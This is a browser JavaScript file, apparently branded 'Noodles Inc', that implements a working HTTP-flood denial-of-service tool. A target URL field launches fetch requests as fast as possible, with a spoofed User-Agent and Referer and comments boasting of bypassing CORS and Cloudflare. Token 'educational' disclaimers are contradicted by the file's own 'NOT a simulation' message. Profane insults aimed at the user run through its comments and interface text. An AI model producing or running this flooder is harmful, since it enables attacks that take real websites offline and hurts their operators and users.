// WARNING: This DDoS tool is for PURELY educational purposes.
// Use it responsibly, you irresponsible fuck.
// Noodles Inc. is NOT responsible for ANY damage you cause. Seriously.
// All actions WILL be logged. Don't say I didn't warn ya.

console.warn("%c Noodles Inc: DDoS tool loaded. Use with extreme fucking caution. Logging enabled.", "color: darkred; font-size: 16px;");

// Explicit user consent required, motherfucker.
if (!confirm("Noodles Inc: WARNING! This DDoS tool is ONLY for educational purposes. Unauthorized use is illegal, you dumbass. Press OK to proceed with EXPLICIT consent. Pressing Cancel will close this shit.")) {
    window.close();
}

// UI elements – Let’s make it look evil, shall we?
const body = document.body;
body.style.backgroundColor = 'black';
body.style.color = 'darkgreen';
body.style.fontFamily = 'monospace';

const startButton = document.createElement('button');
startButton.textContent = 'Start Fucking DDoS';
startButton.style.backgroundColor = 'darkred';
startButton.style.color = 'white';
startButton.style.padding = '10px';
startButton.style.margin = '10px';
startButton.style.border = '2px solid purple';
document.body.appendChild(startButton);

const stopButton = document.createElement('button');
stopButton.textContent = 'Stop Fucking DDoS';
stopButton.style.backgroundColor = 'darkgreen';
stopButton.style.color = 'white';
stopButton.style.padding = '10px';
startButton.style.border = '2px solid darkblue';
startButton.style.margin = '10px';
stopButton.disabled = true; // Initially disabled
document.body.appendChild(stopButton);

const targetUrlInput = document.createElement('input');
targetUrlInput.type = 'text';
targetUrlInput.placeholder = 'Enter target URL, bitch';
targetUrlInput.style.padding = '10px';
targetUrlInput.style.margin = '10px';
targetUrlInput.style.width = '300px';
targetUrlInput.style.backgroundColor = 'black';
targetUrlInput.style.color = 'darkblue';
targetUrlInput.style.border = '1px solid purple';
document.body.appendChild(targetUrlInput);

const timerDisplay = document.createElement('div');
timerDisplay.textContent = 'DDoS Timer: 0 seconds';
timerDisplay.style.margin = '10px';
document.body.appendChild(timerDisplay);

// Educational Information – Yeah, right.
const infoDiv = document.createElement('div');
infoDiv.innerHTML = `
    <h2 style="color: purple;">DDoS Tool Information</h2>
    <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests, potentially overwhelming it and making it unavailable.</p>
    <p style="color: darkred;"><b>Important:</b> Using this tool without authorization is illegal and can have severe consequences. You're a fucking idiot if you do.</p>
`;
infoDiv.style.margin = '10px';
document.body.appendChild(infoDiv);

const logDiv = document.createElement('div');
logDiv.style.margin = '10px';
logDiv.style.color = 'darkgreen';
logDiv.innerHTML = '<h2 style="color: darkblue;">Action Log:</h2><ul id="logList"></ul>';
document.body.appendChild(logDiv);

let floodInterval;
let startTime;

function logAction(message) {
    const logList = document.getElementById('logList');
    const newLog = document.createElement('li');
    newLog.textContent = message;
    logList.appendChild(newLog);
}

function httpFlood(url) {
    // Generate a random string for cache busting and slightly obfuscated Referer header
    const randomString = Math.random().toString(36).substring(2, 15);
    const referer = `https://www.google.com/search?q=${randomString}`;

    fetch(url, {
        mode: 'no-cors', // Bypass CORS like a goddamn ninja
        method: 'GET', // GET request to bypass Cloudflare, you sneaky bastard
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Referer': referer // Spoofed referer, fuck yeah
        }
    }).then(response => {
        console.log('Noodles Inc: Request sent successfully.', response.status);
        logAction(`Request sent successfully to ${url} - Status: ${response.status}`);
    }).catch(error => {
        console.error('Noodles Inc: Error sending request:', error);
        logAction(`Error sending request to ${url}: ${error}`);
    });
    console.log("Noodles Inc: DDoS attack sent to: " + url);  // Log to console
    logAction(`DDoS attack sent to: ${url}`);
}

function startDDoS(targetUrl) {
    if (!targetUrl) {
        alert("Noodles Inc: Please enter a target URL, you fucking moron.");
        return;
    }
    startButton.disabled = true;
    stopButton.disabled = false;
    startTime = new Date();
    floodInterval = setInterval(() => {
        httpFlood(targetUrl);
    }, 0); // Send requests as fast as possible, zero chill.
    updateTimer();
    logAction(`DDoS attack started on ${targetUrl}`);
}

function stopDDoS() {
    clearInterval(floodInterval);
    startButton.disabled = false;
    stopButton.disabled = true;
    logAction('DDoS attack stopped.');
}

function updateTimer() {
    setInterval(() => {
        if (startTime) {
            const elapsedTime = Math.floor((new Date() - startTime) / 1000);
            timerDisplay.textContent = `DDoS Timer: ${elapsedTime} seconds`;
        }
    }, 1000);
}

// Event listeners
startButton.addEventListener('click', () => {
    const targetUrl = targetUrlInput.value;
    startDDoS(targetUrl);
});

stopButton.addEventListener('click', stopDDoS);

console.log("Noodles Inc: HTTP Flood loaded. This is NOT a simulation. Use with extreme fucking caution, you idiot.");
logAction('HTTP Flood tool loaded.');